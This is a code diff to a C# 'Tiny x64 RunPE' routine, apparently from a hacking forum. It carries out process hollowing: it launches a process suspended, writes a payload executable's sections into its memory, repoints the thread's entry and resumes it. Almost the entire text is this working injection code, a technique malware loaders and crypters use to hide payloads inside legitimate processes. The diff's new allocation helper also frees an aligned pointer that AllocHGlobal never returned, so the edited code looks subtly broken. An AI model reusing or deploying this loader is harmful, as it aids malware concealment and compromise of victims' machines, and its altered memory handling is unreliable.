@@ -1,8 +1,8 @@
-using System;
+﻿using System;
 using System.IO;
 using System.Runtime.InteropServices;
 
-namespace _64l
+namespace HackForums.gigajew
 {
     /// <summary>
     /// Tiny x64 RunPE by gigajew
@@ -65,22 +65,21 @@ namespace _64l
             int entryPoint = Marshal.ReadInt32(payloadBuffer, e_lfanew + 0x18 + 0x10);
 
             short numberOfSections = Marshal.ReadInt16(payloadBuffer, e_lfanew + 0x4 + 0x2);
-			short sizeOfOptionalHeader = Marshal.ReadInt16(payloadBuffer, e_lfanew + 0x4 + 0x10);
+            short sizeOfOptionalHeader = Marshal.ReadInt16(payloadBuffer, e_lfanew + 0x4 + 0x10);
 
             long imageBase = Marshal.ReadInt64(payloadBuffer, e_lfanew + 0x18 + 0x18);
 
             byte[] bStartupInfo = new byte[0x68];
             byte[] bProcessInfo = new byte[0x18];
 
-            IntPtr pThreadContext = Marshal.AllocHGlobal(0x4d0 + 0x8);
-            IntPtr apThreadContext = new IntPtr(16 * (((long)pThreadContext + 15) / 16));
+            IntPtr pThreadContext = Allocate(0x4d0,16);
 
             string target_host = host;
             if (!string.IsNullOrEmpty(args))
                 target_host += " " + args;
             string currentDirectory = Directory.GetCurrentDirectory();
 
-            Marshal.WriteInt32(apThreadContext, 0x30, 0x0010001b);
+            Marshal.WriteInt32(pThreadContext, 0x30, 0x0010001b);
 
             CreateProcess(null, target_host, IntPtr.Zero, IntPtr.Zero, true, 0x4u, IntPtr.Zero, currentDirectory, bStartupInfo, bProcessInfo);
             long processHandle = Marshal.ReadInt64(bProcessInfo, 0x0);
@@ -105,21 +104,34 @@ namespace _64l
                 WriteProcessMemory(processHandle, imageBase + virtualAddress, bRawData, bRawData.Length, 0L);
             }
 
-            GetThreadContext(threadHandle, apThreadContext);
+            GetThreadContext(threadHandle, pThreadContext);
 
             byte[] bImageBase = BitConverter.GetBytes(imageBase);
 
-            long rdx = Marshal.ReadInt64(apThreadContext, 0x88);
+            long rdx = Marshal.ReadInt64(pThreadContext, 0x88);
             WriteProcessMemory(processHandle, rdx + 16, bImageBase, 8, 0L);
 
-            Marshal.WriteInt64(apThreadContext, 0x80 /* rcx */, imageBase + entryPoint);
+            Marshal.WriteInt64(pThreadContext, 0x80 /* rcx */, imageBase + entryPoint);
 
-            SetThreadContext(threadHandle, apThreadContext);
+            SetThreadContext(threadHandle, pThreadContext);
             ResumeThread(threadHandle);
 
             Marshal.FreeHGlobal(pThreadContext);
             CloseHandle(processHandle);
             CloseHandle(threadHandle);
+        }
+
+        private static IntPtr Align(IntPtr source, int alignment)
+        {
+            long source64 = source.ToInt64() + (alignment - 1);
+            long aligned = alignment * (source64 / alignment);
+            return new IntPtr(aligned);
+        }
+
+        private static IntPtr Allocate(int size, int alignment)
+        {
+            IntPtr allocated = Marshal.AllocHGlobal(size + (alignment / 2));
+            return Align(allocated, alignment);
         }
     }
 }
